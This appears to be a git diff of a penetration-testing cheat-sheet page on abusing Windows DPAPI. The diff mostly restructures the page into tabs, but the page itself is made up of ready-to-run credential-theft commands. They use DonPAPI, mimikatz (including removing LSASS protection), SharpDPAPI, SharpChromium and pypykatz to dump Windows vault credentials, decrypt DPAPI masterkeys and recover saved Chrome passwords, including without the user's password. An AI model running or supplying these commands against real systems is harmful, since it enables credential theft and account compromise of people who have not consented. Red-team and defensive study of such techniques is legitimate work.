@@ -7,27 +7,51 @@ tags: ["DPAPI", "enum", "Windows", "password", "credentials", "DonPAPI"]
 ---
 ### Abuse #1: Auto dump (From Linux)
 
-[DonPAPI](https://github.com/login-securite/DonPAPI)
+{{< tab set1 tab1 active >}}Linux{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+<div>
 
 ```bash
 DonPAPI collect -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -t <TARGET>
 ```
 
-### Abuse #1: Auto dump (From Windows - mimikatz)
+<small>*Ref: [DonPAPI](https://github.com/login-securite/DonPAPI)*</small>
+
+</div>
+
+{{< /tabcontent >}}
+
+### Abuse #1: Auto dump (From Windows)
+
+{{< tab set2 tab1 active >}}mimikatz{{< /tab >}}
+{{< tab set2 tab2 >}}SharpDPAPI{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
 
 #### 1. Info Gathering
+
+<div>
 
 ```powershell
 cmd /c "dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect"
 ```
 
+</div>
+
 #### 2. Secrets Dump
+
+<div>
 
 ```powershell
 mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' '"dpapi::masterkey /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect\<SID>\<PROTECT_HASH> /sid:<SID> /password:<PASSWORD> /protected"' '"dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' "exit"
 ```
 
-### Abuse #1: Auto dump (From Windows - SharpDPAPI.exe)
+</div>
+
+{{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
+
+<div>
 
 ```bash
 # Run as system
@@ -39,17 +63,36 @@ mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" 
 .\SharpDPAPI.exe credentials /password:<PASSWORD>
 ```
 
-### Abuse #2: Browser Saved Creds (Automatic)
+</div>
 
-[SharpChromium.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe)
+{{< /tabcontent >}}
+
+<br>
+
+---
+
+### Abuse #2: Browser Saved Creds
+
+{{< tab set3 tab1 active >}}Auto{{< /tab >}}
+{{< tab set3 tab2 >}}Manual{{< /tab >}}
+{{< tabcontent set3 tab1 >}}
+
+<div>
 
 ```powershell
 .\SharpChromium.exe logins
 ```
 
-### Abuse #2: Browser Saved Creds (Manual)
+</div>
+
+<small>*Ref: [SharpChromium.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe)*</small>
+
+{{< /tabcontent >}}
+{{< tabcontent set3 tab2 >}}
 
 #### 1. Prepare logindata and localstate file
+
+<div>
 
 ```powershell
 # Get Local State json file, copy and paste to local Linux
@@ -76,14 +119,22 @@ cat logindata_b64 | base64 -d > logindata
 cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
 ```
 
-[pypykatz](https://github.com/skelsec/pypykatz)
+</div>
+
+<div>
 
 ```bash
 # Get masterkey_guid
 pypykatz dpapi describe blob blob
 ```
 
+</div>
+
+<small>*Ref: [pypykatz](https://github.com/skelsec/pypykatz)*</small>
+
 #### 2. Retrieve Keys
+
+<div>
 
 ```powershell
 # Get master key
@@ -100,7 +151,11 @@ type C:\ProgramData\<MASTERKEY_GUID>
 cat masterkey_guid_b64 | base64 -d > masterkey_guid
 ```
 
+</div>
+
 #### 3. Decrypt
+
+<div>
 
 ```bash
 pypykatz dpapi prekey password <SID> <USER_PASSWORD> | tee pkf
@@ -114,7 +169,20 @@ pypykatz dpapi masterkey <MASTERKEY_GUID_FILE> pkf -o mkf
 pypykatz dpapi chrome --logindata logindata mkf localstate
 ```
 
+</div>
+
+{{< /tabcontent >}}
+
+<br>
+
+---
+
 ### Abuse #3: Decrpyt Masterkey without password
+
+{{< tab set4 tab1 active >}}Windows{{< /tab >}}
+{{< tabcontent set4 tab1 >}}
+
+<div>
 
 ```powershell
 # Take note: Last key
@@ -125,5 +193,9 @@ pypykatz dpapi chrome --logindata logindata mkf localstate
 # Decrypt
 .\mimikatz.exe "dpapi::cred /in:C:\users\<USER>\appdata\roaming\microsoft\protect\<SID>\<MASTERKEY_GUID> /masterkey:<KEY>" exit
 ```
+
+</div>
+
+{{< /tabcontent >}}
 
 <br>
